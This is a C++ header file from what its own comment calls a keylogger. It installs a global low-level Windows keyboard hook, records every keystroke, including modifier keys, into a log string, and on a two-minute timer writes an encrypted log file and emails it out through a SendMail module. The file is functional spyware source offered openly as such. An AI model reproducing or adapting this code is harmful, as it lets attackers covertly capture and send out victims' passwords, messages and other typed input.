/*
THIS IS THE MOST IMPORTANT HEADER IN KEYLOGGER
IN CHARGE OF CAPTURING THE KEY STROKES - KEYBOARD EVENT
*/
#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"


//string where all the keys stroke are stored. When send the mail, this will be sent & flushed all content
//If it failed to send mail, this wont be flushed & stored to send in the next time.
std::string keylog = "";

void TimerSendMail()
{
    //In this testing case, we will set 2 mins to Send Mail
    //So that, if in 2mins, the users dont strike any key, then it wont SendMail
    if(keylog.empty())
        return;
    //Create encrypt log
    std::string last_file = IO::WriteLog(keylog);

    if(last_file.empty())
    {
        //IF IT RETURN EMPTY STRING, IT WILL WRITE TO DEBUGGING LOG & SAVE
        Helper::WriteAppLog("File creation was not successful. Keylog '" + keylog + "'");
        return;
    }

    int x = Mail::SendMail("Log [" + last_file + "]",
                           "Hi :)\nThe file has been attached to this mail :)\n"
                           "For testing, enjoy:\n" + keylog,
                           IO::GetOurPath(true) + last_file);
    if(!x == 7)
        Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(x));
    else
        keylog = "";    //clear the content
}

Timer MailTimer(TimerSendMail, 1000*60*2, Timer::Infinite); //Send after 30mins

HHOOK eHook = NULL;     //This is to define the global variable to handle to hook

//THE MAIN FUNCTION OF THE HOOK, CALL BY THE SYSTEM EVERYTIME
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    //if we get ncode < 0 then we use must done sth wrong the hook
    if(nCode < 0)
        CallNextHookEx(eHook, nCode, wparam, lparam);
        //wparam is our key type
        //lparam is our KBDLLHOOKSTRUCT

    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;

    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)     //KNOW THE ACTION PRESS THE KEY
    {
        /*
        This will APPEND KEY TO STRING, which will save to file
        Name is a user_friendly name for the key stroke
        */
        keylog += Keys::KEYS[kbs->vkCode].Name;
        if(kbs->vkCode == VK_RETURN)    //Print out the newline
            keylog += '\n';
    }
    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        //TO VERIFY SOME SPECIAL CASE: UPPERCASE OR LOWERCASE, etc...
        DWORD key = kbs->vkCode;
        if (key == VK_LCONTROL
            || key == VK_RCONTROL
            || key == VK_SHIFT
            || key == VK_RSHIFT
            || key == VK_LSHIFT
            || key == VK_MENU
            || key == VK_LMENU
            || key == VK_RMENU
            || key == VK_CAPITAL
            || key == VK_NUMLOCK
            || key == VK_LWIN
            || key == VK_RWIN)
        {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1, "/");
            keylog += KeyName;
        }
    }

    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool InstallHook()
{
    Helper::WriteAppLog("Hook Started... Timer started");
    MailTimer.Start(true);

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,
                             GetModuleHandle(NULL), 0);
    /*
    WK_KEYBOARD_LL: WE USE KEYBOARD HOOK, this is global hook
    OurKeyboardProc: this will invoke the hook system, accept the hook procedure
    GetModuleHandle:
    */
    return eHook == NULL;
}

bool UninstallHook()    //Didnt kill the keylogger just uninstall the hook
{
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool)b;
}

//CHECK THE HOOK OF THE KEYLOGGER
bool IsHooked()
{
    return (bool) (eHook == NULL);
}
#endif // KEYBHOOK_H
